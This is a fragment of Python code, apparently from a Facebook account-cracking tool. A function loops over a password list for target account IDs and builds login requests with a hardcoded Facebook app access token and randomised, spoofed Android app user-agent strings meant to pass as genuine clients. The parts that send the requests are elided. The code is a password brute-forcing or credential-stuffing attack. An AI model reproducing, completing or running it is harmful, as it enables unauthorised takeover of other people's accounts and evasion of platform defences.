...
def api3(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[lFBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/27.0.0.1341;FBBV/2652437;FBDM/{density=3,width=720,height=1280};FBLC/en_US;FBRV/2710533;FBCR/null;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ZenFone 5;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            head = {'User-Agent':uaddx,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
